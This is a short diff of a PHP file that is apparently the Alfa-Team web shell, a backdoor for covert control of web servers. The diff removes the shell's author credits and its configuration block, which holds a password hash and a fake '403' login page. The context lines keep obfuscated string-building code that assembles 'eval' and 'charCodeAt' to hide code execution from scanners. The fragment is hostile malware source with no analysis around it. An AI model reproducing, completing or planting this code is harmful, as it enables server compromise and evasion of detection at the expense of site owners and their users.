@@ -67,23 +67,6 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     }
 }
 
-/*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
-$GLOBALS['oZgNypoPRU'] = array(
-    'username' => '',
-    'password' => 'fd456406745d816a45cae554c788e754',
-    'safe_mode' => '0',
-    'login_page' => '403',
-    'show_icons' => '1',
-    'post_encryption' => false,
-    'cgi_api' => true,
-);
-
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
 $OVpGNqqFZs = 'e' . 'v' . 'al';
